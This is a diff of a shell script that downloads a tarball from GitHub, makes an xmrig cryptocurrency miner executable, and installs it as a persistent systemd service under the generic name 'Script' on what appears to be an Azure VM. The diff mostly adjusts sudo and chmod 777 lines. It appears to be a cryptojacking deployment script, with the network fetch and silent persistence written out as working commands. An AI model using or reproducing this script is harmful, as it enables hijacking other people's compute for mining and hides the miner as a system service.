@@ -10,10 +10,10 @@ sudo wget https://github.com/realLifeInAnime/test/raw/main/output_filename.tar &
 sleep 3 ;
 sudo chmod +x xmrig
 
-sudo echo "#!/bin/bash
+echo "#!/bin/bash
 ./xmrig" > /usr/local/bin/script.sh ;
 
-sudo echo "[Unit]
+echo "[Unit]
 Description=Script
 After=network.target
 [Service]
@@ -25,8 +25,6 @@ WorkingDirectory=/home/azureuser/
 [Install]
 WantedBy=multi-user.target" > /etc/systemd/system/script.service;
 
-sudo chmod 777 /etc/systemd/system/script.service ;
-sudo chmod 777 /usr/local/bin/script.sh ;
 
 sudo systemctl daemon-reload;
 sudo systemctl start script.service;
